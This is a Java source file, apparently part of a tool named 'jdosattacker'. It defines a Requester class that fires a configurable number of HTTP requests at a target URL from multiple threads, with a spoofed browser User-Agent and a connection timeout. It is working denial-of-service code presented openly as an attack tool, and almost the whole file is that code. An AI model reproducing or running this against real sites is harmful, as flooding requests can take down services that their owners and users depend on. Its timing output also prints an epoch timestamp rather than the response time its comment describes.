package com.anas.jdosattacker.request;

import com.anas.jdosattacker.FieldException;

import javax.net.ssl.HttpsURLConnection;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;

public class Requester implements Runnable {
    private static int connectTimeout = 5000;
    private static String userAgent,
            requestMethod;
    private static String url;
    private static int reqNumber;

    // Initialize the static variables
    static {
        userAgent = """
            Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
             Chrome/60.0.3112.113 Safari/537.36
             """.replace("\n", "");
        setRequestMethod(null); // null means GET
    }

    /**
     * If any of the fields are null or empty, return true
     *
     * @return true if any of the fields are null or empty, false otherwise
     */
    public static boolean hasRequirementEmptyFields() {
        return (Requester.url == null || Requester.url.isBlank()) ||
                Requester.userAgent.isBlank() ||
                Requester.requestMethod.isBlank() ||
                Requester.connectTimeout == 0 ||
                Requester.reqNumber == 0;
    }

    /**
     * The function sends a request to the given URL and prints the response code, the thread name and the time it took
     * to get the response
     */
    protected void sendRequest() {
        try {
            final var connection = switch (url.substring(0, 7)) {
                case "http://" -> (HttpURLConnection) new URL(url).openConnection();
                case "https:/" -> (HttpsURLConnection) new URL(url).openConnection();
                default -> throw new IllegalArgumentException("Invalid URL");
            };
            connection.setRequestMethod(requestMethod);
            connection.setRequestProperty("User-Agent", userAgent);
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setDoOutput(false);
            connection.setConnectTimeout(connectTimeout);
            connection.connect();
            final var responseCode = connection.getResponseCode();
            System.out.printf("%15s | %16s |  %20s\n", responseCode +
                    (responseCode == HttpsURLConnection.HTTP_OK ? " [OK]" : " [FAIL]"),
                    Thread.currentThread().getName(),
                    System.currentTimeMillis() + "ms");
        } catch (final IOException e) {
            System.out.printf("%15s | %16s |  %20s \n", "[FAIL]",
                    Thread.currentThread().getName(),
                    System.currentTimeMillis() + "ms");
        }
    }


    /**
     * Get the requests number.
     *
     * @return the requests number
     */
    public static int getReqNumber() {
        return reqNumber;
    }

    /**
     * This function sets the number of requests to be sent.
     *
     * @param reqNumber The number of requests.
     * @throws FieldException if the number of requests is less than 1.
     */
    public static void setReqNumber(final int reqNumber) throws FieldException {
        if (reqNumber < 1) {
            throw new FieldException("Number of requests must be greater than 0");
        }
        Requester.reqNumber = reqNumber;
    }

    /**
     * Set the requests number from string.
     *
     * @param reqNumber The number of requests as a string.
     * @throws FieldException if the number of requests is less than 1, or if it's not an integer number.
     */
    public static void setReqNumber(final String reqNumber) throws FieldException {
        try {
            Requester.setReqNumber(Integer.parseInt(reqNumber));
        } catch (final NumberFormatException e) {
            throw new FieldException("Number of requests must be an integer number greater than 0");
        }
    }

    /**
     * Get the target url, If the url variable is null, return an empty string, otherwise return the url.
     *
     * @return The target url.
     */
    public static String getUrl() {
        return url == null ? "" : url;
    }

    /**
     * Set the target url for all instances
     *  If the url is null or blank, throw a FieldException.
     *  If the url doesn't start with http:// or https://, throw a FieldException, Otherwise, set the url.
     *
     * @param url The target url.
     * @throws FieldException if the url is null or blank, or if the url doesn't start with http:// or https://.
     */
    public static void setUrl(final String url) throws FieldException {
        if (url == null || url.isBlank()) {
            throw new FieldException("URL cannot be empty");
        }
        if (!url.startsWith("http://") && !url.startsWith("https://")) {
            throw new FieldException("URL must start with http:// or https://");
        }
        Requester.url = url;
    }

    public static String getUserAgent() {
        return userAgent;
    }

    /**
     * Set the user agent for all instances.
     *
     * @param userAgent The user agent to use for the request.
     * @throws FieldException if the user agent is null.
     */
    public static void setUserAgent(final String userAgent) throws FieldException {
        if (userAgent == null) {
            throw new FieldException("User-Agent cannot be null");
        }
        Requester.userAgent = userAgent;
    }


    /**
     * Set the request method for all instances.
     * If the parameter is null or blank, set it to GET, otherwise set the request method to the request method
     *
     * @param requestMethod The HTTP request method to use.
     */
    public static void setRequestMethod(final String requestMethod) {
        if (requestMethod == null || requestMethod.isBlank()) {
            Requester.requestMethod = "GET";
        } else {
            Requester.requestMethod = requestMethod;
        }
    }

    /**
     * Get the connection timeout for all instances.
     *
     * @return The connection timeout.
     */
    public static int getConnectTimeout() {
        return connectTimeout;
    }

    /**
     * Set the connection timeout for all instances.
     *
     * @param connectTimeout The time in milliseconds to wait for a connection to be established.
     * @throws FieldException if the connection timeout is less than 1.
     */
    public static void setConnectTimeout(final int connectTimeout) throws FieldException {
        if (connectTimeout < 1) {
            throw new FieldException("Timeout must be greater than 0");
        }
        Requester.connectTimeout = connectTimeout;
    }

    /**
     * Set the connection timeout from string, for all instances.
     *
     * @param connectTimeout The timeout for the connection to the server.
     * @throws FieldException if the connection timeout is less than 1, or if it's not an integer number.
     */
    public static void setConnectTimeout(final String connectTimeout) throws FieldException {
        try {
            Requester.setConnectTimeout(Integer.parseInt(connectTimeout));
        } catch (final NumberFormatException e) {
            throw new FieldException("Timeout must be an integer number, and greater than 0");
        }
    }

    /**
     * Start the requests.
     */
    @Override
    public void run() {
        for (var i = 0; i < reqNumber; i++) {
            sendRequest();
        }
    }
}
